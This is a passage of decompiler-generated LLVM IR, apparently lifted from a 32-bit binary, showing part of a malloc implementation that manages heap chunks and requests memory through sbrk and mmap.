  br i1 %v1_805fceb, label %dec_label_pc_805fd01, label %dec_label_pc_805fced

dec_label_pc_805fced:                             ; preds = %dec_label_pc_805fce6
  %v2_805fcef = mul i32 %v0_805fced, 2
  store i32 %v2_805fcef, i32* %esi.global-to-local, align 4
  %v1_805fcf1 = sub i32 -1, %v0_805fced
  store i32 %v1_805fcf1, i32* %eax.global-to-local, align 4
  %v2_805fcf3 = and i32 %v0_805fcf3, %v1_805fcf1
  store i32 %v2_805fcf3, i32* %edx.global-to-local, align 4
  %v1_805fcf5 = add i32 %v3_805fce6, 8
  store i32 %v1_805fcf5, i32* %ebx.global-to-local, align 4
  %v1_805fcf8 = load i32, i32* @edi, align 4
  %v2_805fcf8 = mul i32 %v1_805fcf8, 4
  %v3_805fcf8 = add i32 %v2_805fcf8, ptrtoint (i32* @global_var_807f454.734 to i32)
  %v4_805fcf8 = inttoptr i32 %v3_805fcf8 to i32*
  store i32 %v2_805fcf3, i32* %v4_805fcf8, align 4
  %v0_805fcae.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805fcae.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805fd01:                             ; preds = %dec_label_pc_805fce6
  %v1_805fd01 = add i32 %v3_805fce6, 4
  %v2_805fd01 = inttoptr i32 %v1_805fd01 to i32*
  %v3_805fd01 = load i32, i32* %v2_805fd01, align 4
  store i32 %v3_805fd01, i32* %edx.global-to-local, align 4
  %v1_805fd04 = add i32 %v3_805fce6, 12
  %v2_805fd04 = inttoptr i32 %v1_805fd04 to i32*
  %v3_805fd04 = load i32, i32* %v2_805fd04, align 4
  store i32 %v3_805fd04, i32* %eax.global-to-local, align 4
  %v1_805fd07 = and i32 %v3_805fd01, -4
  store i32 %v1_805fd07, i32* %edx.global-to-local, align 4
  %v5_805fd0c = sub i32 %v1_805fd07, %v1_805fe06
  store i32 %v5_805fd0c, i32* %esi.global-to-local, align 4
  store i32 %v3_805fd04, i32* %v2_805fce6, align 4
  %v0_805fd13 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805fd13 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fd13 = add i32 %v1_805fd13, 8
  %v3_805fd13 = inttoptr i32 %v2_805fd13 to i32*
  store i32 %v0_805fd13, i32* %v3_805fd13, align 4
  %v0_805fd16 = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_805fd16, 16
  %v0_805fd1b = load i32, i32* @ecx, align 4
  br i1 %tmp129, label %dec_label_pc_805fd1b, label %dec_label_pc_805fd22

dec_label_pc_805fd1b:                             ; preds = %dec_label_pc_805fd01
  %v1_805fd1b = load i32, i32* %edx.global-to-local, align 4
  %v2_805fd1b = add i32 %v0_805fd1b, 4
  %v3_805fd1b = add i32 %v2_805fd1b, %v1_805fd1b
  %v4_805fd1b = inttoptr i32 %v3_805fd1b to i32*
  %v5_805fd1b = load i32, i32* %v4_805fd1b, align 4
  %v6_805fd1b = or i32 %v5_805fd1b, 1
  store i32 %v6_805fd1b, i32* %v4_805fd1b, align 4
  br label %dec_label_pc_805fd69

dec_label_pc_805fd22:                             ; preds = %dec_label_pc_805fd01
  %v2_805fd26 = add i32 %v0_805fd1b, %v1_805fe06
  store i32 %v2_805fd26, i32* %eax.global-to-local, align 4
  %v1_805fd2f = load i32, i32* @ebp, align 4
  %v2_805fd2f = add i32 %v1_805fd2f, 8
  %v3_805fd2f = inttoptr i32 %v2_805fd2f to i32*
  store i32 %v2_805fd26, i32* %v3_805fd2f, align 4
  %v0_805fd32 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fd32 = load i32, i32* @ebp, align 4
  %v2_805fd32 = add i32 %v1_805fd32, 12
  %v3_805fd32 = inttoptr i32 %v2_805fd32 to i32*
  store i32 %v0_805fd32, i32* %v3_805fd32, align 4
  %v0_805fd35 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fd35 = add i32 %v0_805fd35, 8
  %v2_805fd35 = inttoptr i32 %v1_805fd35 to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v2_805fd35, align 4
  %v0_805fd3c = load i32, i32* %eax.global-to-local, align 4
  %v1_805fd3c = add i32 %v0_805fd3c, 12
  %v2_805fd3c = inttoptr i32 %v1_805fd3c to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v2_805fd3c, align 4
  %v0_805fd43 = load i32, i32* @global_var_807f150.731, align 16
  %v4_805fd49 = load i32, i32* %eax.global-to-local, align 4
  %v5_805fd49 = select i1 %v8_805faaf, i32 %v4_805fd49, i32 %v0_805fd43
  %v4_805fd4c = or i32 %v1_805fe06, 1
  store i32 %v5_805fd49, i32* @global_var_807f150.731, align 16
  %v0_805fd57 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805fd4c, i32* %ebx.global-to-local, align 4
  %v1_805fd5d = or i32 %v0_805fd57, 1
  store i32 %v1_805fd5d, i32* %edx.global-to-local, align 4
  %v3_805fd60 = add i32 %v0_805fd57, %v4_805fd49
  %v4_805fd60 = inttoptr i32 %v3_805fd60 to i32*
  store i32 %v0_805fd57, i32* %v4_805fd60, align 4
  %v0_805fd63 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805fd63 = load i32, i32* @ecx, align 4
  %v2_805fd63 = add i32 %v1_805fd63, 4
  %v3_805fd63 = inttoptr i32 %v2_805fd63 to i32*
  store i32 %v0_805fd63, i32* %v3_805fd63, align 4
  %v0_805fd66 = load i32, i32* %edx.global-to-local, align 4
  %v1_805fd66 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fd66 = add i32 %v1_805fd66, 4
  %v3_805fd66 = inttoptr i32 %v2_805fd66 to i32*
  store i32 %v0_805fd66, i32* %v3_805fd66, align 4
  br label %dec_label_pc_805fd69

dec_label_pc_805fd69:                             ; preds = %dec_label_pc_805fe5d, %dec_label_pc_805fd1b, %dec_label_pc_805fd22
  %v0_805fd69 = load i32, i32* @ecx, align 4
  %v1_805fd69 = add i32 %v0_805fd69, 8
  store i32 %v1_805fd69, i32* @ebx, align 4
  br label %dec_label_pc_8060191

dec_label_pc_805fd71.loopexit:                    ; preds = %dec_label_pc_805fcb6
  br label %dec_label_pc_805fd71

dec_label_pc_805fd71:                             ; preds = %dec_label_pc_805fd71.loopexit, %dec_label_pc_805fa71, %dec_label_pc_805fa79
  %v0_805fd71 = load i32, i32* @global_var_807f14c.730, align 4
  store i32 %v0_805fd71, i32* @ebx, align 4
  store i32 %v1_805fe06, i32* %esi.global-to-local, align 4
  %v1_805fd7b = add i32 %v0_805fd71, 4
  %v2_805fd7b = inttoptr i32 %v1_805fd7b to i32*
  %v3_805fd7b = load i32, i32* %v2_805fd7b, align 4
  %v1_805fd7e = add i32 %v1_805fe06, 16
  store i32 %v1_805fd7e, i32* @esi, align 4
  %v1_805fd85 = and i32 %v3_805fd7b, -4
  store i32 %v1_805fd85, i32* %ecx.global-to-local, align 4
  %v7_805fd88 = icmp ult i32 %v1_805fd85, %v1_805fd7e
  br i1 %v7_805fd88, label %dec_label_pc_805fda8, label %dec_label_pc_805fd8c

dec_label_pc_805fd8c:                             ; preds = %dec_label_pc_805fd71
  %v2_805fd90 = add i32 %v0_805fd71, %v1_805fe06
  store i32 %v2_805fd90, i32* %edx.global-to-local, align 4
  %v1_805fd93 = or i32 %v1_805fe06, 1
  store i32 %v1_805fd93, i32* %eax.global-to-local, align 4
  store i32 %v2_805fd90, i32* @global_var_807f14c.730, align 4
  store i32 %v1_805fd93, i32* %v2_805fd7b, align 4
  %v0_805fd9f = load i32, i32* %ecx.global-to-local, align 4
  %v5_805fd9f = sub i32 %v0_805fd9f, %v1_805fe06
  store i32 %v5_805fd9f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8060121

dec_label_pc_805fda8:                             ; preds = %dec_label_pc_805fd71
  %v0_805fda8 = load i8, i8* @global_var_807f120.729, align 32
  %v1_805fda8 = and i8 %v0_805fda8, 2
  %v2_805fda8 = icmp eq i8 %v1_805fda8, 0
  %v0_805fdaf = load i32, i32* @global_var_807f47c.735, align 4
  store i32 %v0_805fdaf, i32* %edx.global-to-local, align 4
  br i1 %v2_805fda8, label %dec_label_pc_805fddc, label %dec_label_pc_805fdb7

dec_label_pc_805fdb7:                             ; preds = %dec_label_pc_805fda8
  store i32 ptrtoint (i8* @global_var_807f120.729 to i32), i32* %stack_var_-92, align 4
  %v2_805fdbf = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f120.729 to i32*))
  store i32 ptrtoint (i8* @global_var_807f120.729 to i32), i32* @ebx, align 4
  %v1_805fdc9 = add i32 %v1_805fe06, -7
  store i32 %v1_805fdc9, i32* %eax.global-to-local, align 4
  store i32 %v1_805fdc9, i32* %stack_var_-92, align 4
  %v1_805fdcd = call i32 @malloc(i32 %v1_805fdc9)
  store i32 %v1_805fdcd, i32* %eax.global-to-local, align 4
  store i32 %v1_805fdcd, i32* @ebx, align 4
  br label %dec_label_pc_8060191

dec_label_pc_805fddc:                             ; preds = %dec_label_pc_805fda8
  store i32 %v1_805fe06, i32* @ebx, align 4
  %v1_805fde0 = add i32 %v0_805fdaf, -1
  store i32 %v1_805fde0, i32* @ecx, align 4
  %v1_805fde3 = load i32, i32* @global_var_807f46c.736, align 4
  %v7_805fde3 = icmp ult i32 %v1_805fe06, %v1_805fde3
  br i1 %v7_805fde3, label %dec_label_pc_805febe, label %dec_label_pc_805fdf3

dec_label_pc_805fdf3:                             ; preds = %dec_label_pc_805fddc
  %v0_805fdf3 = load i32, i32* @global_var_807f470.737, align 16
  store i32 %v0_805fdf3, i32* %eax.global-to-local, align 4
  %v1_805fdf8 = load i32, i32* @global_var_807f474.738, align 4
  %v5_805fdfe = icmp slt i32 %v0_805fdf3, %v1_805fdf8
  br i1 %v5_805fdfe, label %dec_label_pc_805fe04, label %dec_label_pc_805febe

dec_label_pc_805fe04:                             ; preds = %dec_label_pc_805fdf3
  %v2_805fe06 = add i32 %v1_805fe06, 10
  %v3_805fe06 = add i32 %v2_805fe06, %v0_805fdaf
  %v1_805fe0a = sub i32 0, %v0_805fdaf
  store i32 %v1_805fe0a, i32* %eax.global-to-local, align 4
  %v2_805fe0c = and i32 %v3_805fe06, %v1_805fe0a
  store i32 %v2_805fe0c, i32* @ebx, align 4
  %tmp130 = icmp ugt i32 %v2_805fe0c, %v1_805fe06
  br i1 %tmp130, label %dec_label_pc_805fe18, label %dec_label_pc_805febe

dec_label_pc_805fe18:                             ; preds = %dec_label_pc_805fe04
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805fe25 = call i32 @mmap(i32 0, i32 %v2_805fe0c, i32 3, i32 34, i32 0, i32 0, i32 %v1_805fde0, i32 %v1_805fde0)
  store i32 %v8_805fe25, i32* %eax.global-to-local, align 4
  %v10_805fe2d = icmp eq i32 %v8_805fe25, -1
  store i32 %v8_805fe25, i32* %edx.global-to-local, align 4
  br i1 %v10_805fe2d, label %dec_label_pc_805fe18.dec_label_pc_805febe_crit_edge, label %dec_label_pc_805fe38

dec_label_pc_805fe18.dec_label_pc_805febe_crit_edge: ; preds = %dec_label_pc_805fe18
  %v0_805febe.pre = load i32, i32* @global_var_807f14c.730, align 4
  br label %dec_label_pc_805febe

dec_label_pc_805fe38:                             ; preds = %dec_label_pc_805fe18
  %v1_805fe3a = urem i32 %v8_805fe25, 8
  %v2_805fe3a = icmp eq i32 %v1_805fe3a, 0
  store i32 %v1_805fe3a, i32* %ecx.global-to-local, align 4
  br i1 %v2_805fe3a, label %dec_label_pc_805fe53, label %dec_label_pc_805fe3f

dec_label_pc_805fe3f:                             ; preds = %dec_label_pc_805fe38
  %v0_805fe44 = load i32, i32* @ebx, align 4
  %v2_805fe46 = sub nsw i32 8, %v1_805fe3a
  store i32 %v2_805fe46, i32* %eax.global-to-local, align 4
  %v2_805fe48 = add i32 %v2_805fe46, %v8_805fe25
  store i32 %v2_805fe48, i32* @ecx, align 4
  %v2_805fe4b = sub i32 %v0_805fe44, %v2_805fe46
  store i32 %v2_805fe4b, i32* %esi.global-to-local, align 4
  %v2_805fe4d = inttoptr i32 %v2_805fe48 to i32*
  store i32 %v2_805fe46, i32* %v2_805fe4d, align 4
  br label %dec_label_pc_805fe5d

dec_label_pc_805fe53:                             ; preds = %dec_label_pc_805fe38
  store i32 %v8_805fe25, i32* @ecx, align 4
  %v1_805fe55 = inttoptr i32 %v8_805fe25 to i32*
  store i32 0, i32* %v1_805fe55, align 4
  br label %dec_label_pc_805fe5d

dec_label_pc_805fe5d:                             ; preds = %dec_label_pc_805fe3f, %dec_label_pc_805fe53
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805fe3f ], [ @ebx, %dec_label_pc_805fe53 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805fe5d = or i32 %storemerge, 2
  %v1_805fe60 = load i32, i32* @ecx, align 4
  %v2_805fe60 = add i32 %v1_805fe60, 4
  %v3_805fe60 = inttoptr i32 %v2_805fe60 to i32*
  store i32 %v1_805fe5d, i32* %v3_805fe60, align 4
  %v0_805fe63 = load i32, i32* @global_var_807f470.737, align 16
  %v0_805fe68 = load i32, i32* @global_var_807f490.739, align 16
  %v1_805fe6e = add i32 %v0_805fe63, 1
  %v1_805fe6f = load i32, i32* @global_var_807f478.740, align 8
  %v2_805fe6f = sub i32 %v1_805fe6e, %v1_805fe6f
  %v8_805fe6f = xor i32 %v1_805fe6f, %v1_805fe6e
  %v9_805fe6f = xor i32 %v2_805fe6f, %v1_805fe6e
  %v10_805fe6f = and i32 %v9_805fe6f, %v8_805fe6f
  %v11_805fe6f = icmp slt i32 %v10_805fe6f, 0
  %v12_805fe6f = icmp eq i32 %v2_805fe6f, 0
  %v13_805fe6f = icmp slt i32 %v2_805fe6f, 0
  store i32 %v1_805fe6e, i32* @global_var_807f470.737, align 16
  %v3_805fe7a = icmp ne i1 %v13_805fe6f, %v11_805fe6f
  %v4_805fe7a = or i1 %v12_805fe6f, %v3_805fe7a
  %v7_805fe7a = select i1 %v4_805fe7a, i32 %v1_805fe6f, i32 %v1_805fe6e
  store i32 %v7_805fe7a, i32* @global_var_807f478.740, align 8
  %v0_805fe86 = load i32, i32* @global_var_807f484.741, align 4
  %v1_805fe8b = load i32, i32* @ebx, align 4
  %v2_805fe8b = add i32 %v1_805fe8b, %v0_805fe86
  store i32 %v2_805fe8b, i32* @global_var_807f484.741, align 4
  %tmp86 = icmp ule i32 %v2_805fe8b, %v0_805fe68
  %v5_805fe98 = select i1 %tmp86, i32 %v0_805fe68, i32 %v2_805fe8b
  store i32 %v5_805fe98, i32* %edx.global-to-local, align 4
  %v1_805fe9b = load i32, i32* @global_var_807f488.742, align 8
  %v2_805fe9b = add i32 %v1_805fe9b, %v2_805fe8b
  store i32 %v5_805fe98, i32* @global_var_807f490.739, align 16
  %v1_805fea7 = load i32, i32* @global_var_807f494.743, align 4
  %tmp131 = icmp ule i32 %v2_805fe9b, %v1_805fea7
  %v5_805fead = select i1 %tmp131, i32 %v1_805fea7, i32 %v2_805fe9b
  store i32 %v5_805fead, i32* %eax.global-to-local, align 4
  store i32 %v5_805fead, i32* @global_var_807f494.743, align 4
  br label %dec_label_pc_805fd69

dec_label_pc_805febe:                             ; preds = %dec_label_pc_805fe04, %dec_label_pc_805fe18.dec_label_pc_805febe_crit_edge, %dec_label_pc_805fdf3, %dec_label_pc_805fddc
  %v0_805febe = phi i32 [ %v0_805febe.pre, %dec_label_pc_805fe18.dec_label_pc_805febe_crit_edge ], [ %v0_805fd71, %dec_label_pc_805fdf3 ], [ %v0_805fd71, %dec_label_pc_805fe04 ], [ %v0_805fd71, %dec_label_pc_805fddc ]
  store i32 %v0_805febe, i32* %eax.global-to-local, align 4
  %v1_805fec7 = add i32 %v0_805febe, 4
  %v2_805fec7 = inttoptr i32 %v1_805fec7 to i32*
  %v3_805fec7 = load i32, i32* %v2_805fec7, align 4
  %v1_805fece = and i32 %v3_805fec7, -4
  %v2_805fece = icmp eq i32 %v1_805fece, 0
  store i32 %v1_805fece, i32* @ebp, align 4
  %v1_805fed4 = load i32, i32* @global_var_807f468.744, align 8
  %v0_805fede = load i8, i8* @global_var_807f480.745, align 128
  %v1_805fede = urem i8 %v0_805fede, 2
  %v2_805fede = icmp eq i8 %v1_805fede, 0
  %v1_805fee5 = icmp eq i1 %v2_805fede, false
  %v1_805fece.op = sub i32 0, %v1_805fece
  %v2_805fedc.neg = select i1 %v1_805fee5, i32 %v1_805fece.op, i32 0
  %v2_805fed4 = add i32 %v1_805fde0, %v1_805fd7e
  %v4_805fee5 = add i32 %v2_805fed4, %v1_805fed4
  %v5_805feec = add i32 %v4_805fee5, %v2_805fedc.neg
  store i32 %v5_805feec, i32* %eax.global-to-local, align 4
  %v1_805fef0 = sub i32 0, %v0_805fdaf
  store i32 %v1_805fef0, i32* %edx.global-to-local, align 4
  %v2_805fef4 = and i32 %v5_805feec, %v1_805fef0
  store i32 %v2_805fef4, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_805fef4, 1
  br i1 %tmp87, label %dec_label_pc_805ff12, label %dec_label_pc_805fefc

dec_label_pc_805fefc:                             ; preds = %dec_label_pc_805febe
  store i32 %v2_805fef4, i32* %stack_var_-92, align 4
  %v1_805ff00 = call i32 @__GI_sbrk(i32 %v2_805fef4)
  store i32 %v1_805ff00, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v10_805ff0b = icmp eq i32 %v1_805ff00, -1
  store i32 %v1_805ff00, i32* @ebx, align 4
  %v1_805ff10 = icmp eq i1 %v10_805ff0b, false
  br i1 %v1_805ff10, label %dec_label_pc_805ff69, label %dec_label_pc_805fefc.dec_label_pc_805ff12_crit_edge

dec_label_pc_805fefc.dec_label_pc_805ff12_crit_edge: ; preds = %dec_label_pc_805fefc
  %v0_805ff12.pre = load i8, i8* @global_var_807f480.745, align 128
  br label %dec_label_pc_805ff12

dec_label_pc_805ff12:                             ; preds = %dec_label_pc_805fefc.dec_label_pc_805ff12_crit_edge, %dec_label_pc_805febe
  %v0_805ff3f = phi i32 [ -1, %dec_label_pc_805fefc.dec_label_pc_805ff12_crit_edge ], [ %v1_805fef0, %dec_label_pc_805febe ]
  %v0_805ff12 = phi i8 [ %v0_805ff12.pre, %dec_label_pc_805fefc.dec_label_pc_805ff12_crit_edge ], [ %v0_805fede, %dec_label_pc_805febe ]
  %v1_805ff12 = urem i8 %v0_805ff12, 2
  %v2_805ff12 = icmp eq i8 %v1_805ff12, 0
  br i1 %v2_805ff12, label %dec_label_pc_805ff12.dec_label_pc_805ff27_crit_edge, label %dec_label_pc_805ff1b

dec_label_pc_805ff12.dec_label_pc_805ff27_crit_edge: ; preds = %dec_label_pc_805ff12
  %v0_805ff27.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805ff27

dec_label_pc_805ff1b:                             ; preds = %dec_label_pc_805ff12
  %v2_805ff1f = add i32 %v1_805fece, %v1_805fde0
  store i32 %v2_805ff1f, i32* %eax.global-to-local, align 4
  %v0_805ff21 = load i32, i32* @esi, align 4
  %v2_805ff21 = add i32 %v0_805ff21, %v2_805ff1f
  %v5_805ff23 = and i32 %v2_805ff21, %v1_805fef0
  store i32 %v5_805ff23, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805ff27

dec_label_pc_805ff27:                             ; preds = %dec_label_pc_805ff12.dec_label_pc_805ff27_crit_edge, %dec_label_pc_805ff1b
  %v3_805ff32 = phi i32 [ %v0_805ff27.pre, %dec_label_pc_805ff12.dec_label_pc_805ff27_crit_edge ], [ %v5_805ff23, %dec_label_pc_805ff1b ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_805ff32, 1048576
  %v5_805ff32 = select i1 %tmp88, i32 1048576, i32 %v3_805ff32
  store i32 %v5_805ff32, i32* @esi, align 4
  %tmp132 = icmp ugt i32 %v5_805ff32, %v1_805fe06
  br i1 %tmp132, label %dec_label_pc_805ff3f, label %dec_label_pc_8060184

dec_label_pc_805ff3f:                             ; preds = %dec_label_pc_805ff27
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805ff4c = call i32 @mmap(i32 0, i32 %v5_805ff32, i32 3, i32 34, i32 0, i32 0, i32 %v0_805ff3f, i32 %v0_805ff3f)
  store i32 %v8_805ff4c, i32* %eax.global-to-local, align 4
  %v10_805ff54 = icmp eq i32 %v8_805ff4c, -1
  store i32 %v8_805ff4c, i32* @ebx, align 4
  br i1 %v10_805ff54, label %dec_label_pc_8060184, label %dec_label_pc_805ff5f

dec_label_pc_805ff5f:                             ; preds = %dec_label_pc_805ff3f
  %v0_805ff5f = load i8, i8* @global_var_807f480.745, align 1
  %v2_805ff5f = and i8 %v0_805ff5f, -2
  store i8 %v2_805ff5f, i8* @global_var_807f480.745, align 128
  %v1_805ff66 = load i32, i32* @esi, align 4
  %v2_805ff66 = add i32 %v1_805ff66, %v8_805ff4c
  store i32 %v2_805ff66, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805ff69

dec_label_pc_805ff69:                             ; preds = %dec_label_pc_805fefc, %dec_label_pc_805ff5f
  %v0_8060030 = phi i32 [ -1, %dec_label_pc_805fefc ], [ %v2_805ff66, %dec_label_pc_805ff5f ]
  %v0_806003e = phi i32 [ %v1_805ff00, %dec_label_pc_805fefc ], [ %v8_805ff4c, %dec_label_pc_805ff5f ]
  %v10_805ff69 = icmp eq i32 %v0_806003e, -1
  br i1 %v10_805ff69, label %dec_label_pc_8060184, label %dec_label_pc_805ff72

dec_label_pc_805ff72:                             ; preds = %dec_label_pc_805ff69
  %v0_805ff76 = load i32, i32* @global_var_807f488.742, align 8
  %v1_805ff76 = load i32, i32* @esi, align 4
  %v2_805ff76 = add i32 %v1_805ff76, %v0_805ff76
  store i32 %v2_805ff76, i32* @global_var_807f488.742, align 8
  %v2_805ff7c = add i32 %v1_805fece, %v0_805febe
  store i32 %v2_805ff7c, i32* %ecx.global-to-local, align 4
  %v2_805ff7e = sub i32 %v0_806003e, %v2_805ff7c
  %v7_805ff7e = icmp ult i32 %v0_806003e, %v2_805ff7c
  %v12_805ff7e = icmp eq i32 %v2_805ff7e, 0
  %v1_805ff80 = icmp eq i1 %v12_805ff7e, false
  br i1 %v1_805ff80, label %dec_label_pc_805ff99, label %dec_label_pc_805ff82

dec_label_pc_805ff82:                             ; preds = %dec_label_pc_805ff72
  %v10_805ff82 = icmp eq i32 %v0_8060030, -1
  %v1_805ff85 = icmp eq i1 %v10_805ff82, false
  br i1 %v1_805ff85, label %dec_label_pc_805ff99, label %dec_label_pc_805ff87

dec_label_pc_805ff87:                             ; preds = %dec_label_pc_805ff82
  store i32 %v0_805febe, i32* %ecx.global-to-local, align 4
  %v2_805ff8b = add i32 %v1_805ff76, %v1_805fece
  %v1_805ff8e = or i32 %v2_805ff8b, 1
  store i32 %v1_805ff8e, i32* %eax.global-to-local, align 4
  store i32 %v1_805ff8e, i32* %v2_805fec7, align 4
  br label %dec_label_pc_80600c6

dec_label_pc_805ff99:                             ; preds = %dec_label_pc_805ff82, %dec_label_pc_805ff72
  %v0_805ff99 = load i8, i8* @global_var_807f480.745, align 1
  %v1_805ff99 = sext i8 %v0_805ff99 to i32
  store i32 %v1_805ff99, i32* %eax.global-to-local, align 4
  %v2_805ff9e = urem i8 %v0_805ff99, 2
  %v3_805ff9e = icmp eq i8 %v2_805ff9e, 0
  br i1 %v3_805ff9e, label %dec_label_pc_805ffb2, label %dec_label_pc_805ffa2

dec_label_pc_805ffa2:                             ; preds = %dec_label_pc_805ff99
  br i1 %v2_805fece, label %dec_label_pc_805ffb2, label %dec_label_pc_805ffa6

dec_label_pc_805ffa6:                             ; preds = %dec_label_pc_805ffa2
  %v1_805ffa8 = icmp eq i1 %v7_805ff7e, false
  br i1 %v1_805ffa8, label %dec_label_pc_805ffb2, label %dec_label_pc_805ffaa

dec_label_pc_805ffaa:                             ; preds = %dec_label_pc_805ffa6
  %v1_805ffaa = and i32 %v1_805ff99, -2
  %v4_805ffaa = trunc i32 %v1_805ffaa to i8
  store i32 %v1_805ffaa, i32* %eax.global-to-local, align 4
  store i8 %v4_805ffaa, i8* @global_var_807f480.745, align 128
  br label %dec_label_pc_805ffb2

dec_label_pc_805ffb2:                             ; preds = %dec_label_pc_805ffa6, %dec_label_pc_805ffa2, %dec_label_pc_805ff99, %dec_label_pc_805ffaa
  %v0_805ffb2 = phi i8 [ %v0_805ff99, %dec_label_pc_805ffa6 ], [ %v0_805ff99, %dec_label_pc_805ffa2 ], [ %v0_805ff99, %dec_label_pc_805ff99 ], [ %v4_805ffaa, %dec_label_pc_805ffaa ]
  %v1_805ffb2 = urem i8 %v0_805ffb2, 2
  %v2_805ffb2 = icmp eq i8 %v1_805ffb2, 0
  br i1 %v2_805ffb2, label %dec_label_pc_8060030, label %dec_label_pc_805ffbb

dec_label_pc_805ffbb:                             ; preds = %dec_label_pc_805ffb2
  br i1 %v2_805fece, label %dec_label_pc_805ffc9, label %dec_label_pc_805ffbf

dec_label_pc_805ffbf:                             ; preds = %dec_label_pc_805ffbb
  store i32 %v2_805ff7e, i32* %eax.global-to-local, align 4
  %v2_805ffc3 = add i32 %v2_805ff76, %v2_805ff7e
  store i32 %v2_805ffc3, i32* @global_var_807f488.742, align 8
  br label %dec_label_pc_805ffc9

dec_label_pc_805ffc9:                             ; preds = %dec_label_pc_805ffbb, %dec_label_pc_805ffbf
  %v1_805ffcb = urem i32 %v0_806003e, 8
  %v2_805ffcb = icmp eq i32 %v1_805ffcb, 0
  store i32 %v1_805ffcb, i32* %edx.global-to-local, align 4
  %v1_805ffce = icmp eq i1 %v2_805ffcb, false
  br i1 %v1_805ffce, label %dec_label_pc_805ffd6, label %dec_label_pc_805ffd0

dec_label_pc_805ffd0:                             ; preds = %dec_label_pc_805ffc9
  store i32 %v0_806003e, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ffe0

dec_label_pc_805ffd6:                             ; preds = %dec_label_pc_805ffc9
  %v2_805ffdb = sub nsw i32 8, %v1_805ffcb
  store i32 %v2_805ffdb, i32* %eax.global-to-local, align 4
  %v2_805ffdd = add i32 %v2_805ffdb, %v0_806003e
  store i32 %v2_805ffdd, i32* @edi, align 4
  br label %dec_label_pc_805ffe0

dec_label_pc_805ffe0:                             ; preds = %dec_label_pc_805ffd0, %dec_label_pc_805ffd6
  %v0_805ffed = phi i32 [ 0, %dec_label_pc_805ffd0 ], [ %v2_805ffdb, %dec_label_pc_805ffd6 ]
  %v2_805ffe0 = add i32 %v1_805ff76, %v0_806003e
  %v2_805ffed = add i32 %v0_805ffed, %v1_805fece
  store i32 %v2_805ffed, i32* %ecx.global-to-local, align 4
  %v2_805fff0 = add i32 %v2_805ffed, %v2_805ffe0
  store i32 %v2_805fff0, i32* %edx.global-to-local, align 4
  %v2_805fff2 = add i32 %v2_805fff0, %v1_805fde0
  %v5_805fff5 = and i32 %v2_805fff2, %v1_805fef0
  %v2_805fffc = sub i32 %v5_805fff5, %v2_805fff0
  store i32 %v2_805fffc, i32* %eax.global-to-local, align 4
  %v2_805fffe = add i32 %v2_805fffc, %v2_805ffed
  store i32 %v2_805fffe, i32* @esi, align 4
  store i32 %v2_805fffe, i32* %stack_var_-92, align 4
  %v1_8060002 = call i32 @__GI_sbrk(i32 %v2_805fffe)
  store i32 %v1_8060002, i32* %eax.global-to-local, align 4
  %v10_806000a = icmp eq i32 %v1_8060002, -1
  store i32 %v1_8060002, i32* %edx.global-to-local, align 4
  %v1_806000f = icmp eq i1 %v10_806000a, false
  br i1 %v1_806000f, label %dec_label_pc_806001f, label %dec_label_pc_8060011

dec_label_pc_8060011:                             ; preds = %dec_label_pc_805ffe0
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8060016 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8060016, i32* %eax.global-to-local, align 4
  store i32 %v1_8060016, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060053

dec_label_pc_806001f:                             ; preds = %dec_label_pc_805ffe0
  %v1_806001f = load i32, i32* @ebx, align 4
  %v7_806001f = icmp ult i32 %v1_8060002, %v1_806001f
  %v1_8060021 = icmp eq i1 %v7_806001f, false
  br i1 %v1_8060021, label %dec_label_pc_8060058, label %dec_label_pc_8060023

dec_label_pc_8060023:                             ; preds = %dec_label_pc_806001f
  %v0_8060023 = load i8, i8* @global_var_807f480.745, align 1
  %v2_8060023 = and i8 %v0_8060023, -2
  store i8 %v2_8060023, i8* @global_var_807f480.745, align 128
  store i32 %v2_805ffe0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060037

dec_label_pc_8060030:                             ; preds = %dec_label_pc_805ffb2
  %v10_8060030 = icmp eq i32 %v0_8060030, -1
  br i1 %v10_8060030, label %dec_label_pc_806003b, label %dec_label_pc_8060035

dec_label_pc_8060035:                             ; preds = %dec_label_pc_8060030
  store i32 %v0_806003e, i32* @edi, align 4
  br label %dec_label_pc_8060037

dec_label_pc_8060037:                             ; preds = %dec_label_pc_8060023, %dec_label_pc_8060035
  %v0_806005847 = phi i32 [ %v2_805ffe0, %dec_label_pc_8060023 ], [ %v0_8060030, %dec_label_pc_8060035 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8060058

dec_label_pc_806003b:                             ; preds = %dec_label_pc_8060030
  store i32 %v0_806003e, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8060042 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8060042, i32* %edx.global-to-local, align 4
  %v1_8060049 = load i32, i32* @ebx, align 4
  %v2_8060049 = sub i32 %v1_8060042, %v1_8060049
